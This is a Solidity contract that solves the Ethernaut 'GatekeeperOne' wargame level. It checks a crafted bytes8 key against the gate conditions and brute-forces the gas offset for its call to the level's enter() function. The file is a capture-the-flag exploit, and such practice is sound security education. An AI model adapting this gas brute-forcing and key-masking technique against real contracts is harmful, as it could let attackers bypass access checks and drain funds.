// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatesmasherOne {
    address gateToSmash = address(0x516014D79F379f16F06fd7961e14f027E7eB87C9);

    // turns out we don't smash the gate we use a key oops too late to go back on the cool name
    bytes8 key;

    constructor(bytes8 _key) public {
        // setting key to 0x1111111100009ad3 in the contract seemed too complicated
        // so I just pass it in during construction
        key = _key;

        // make sure my key actually works
        require(
            uint32(uint64(key)) == uint16(uint64(key)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(key)) != uint64(key),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(key)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
    }

    function smashGate() public {
        bytes memory payload = abi.encodeWithSignature("enter(bytes8)", key);

        /*
        (bool success, ) = gateToSmash.call{gas: 24819}(payload);

        require(success, "Failed to smashGate().");
        */

        for (uint256 i = 0; i < 66; i++) {
            (bool result, ) = gateToSmash.call{gas: (213 + i) + 8191 * 3}(
                payload
            );

            if (result) {
                break;
            }
        }
    }
}
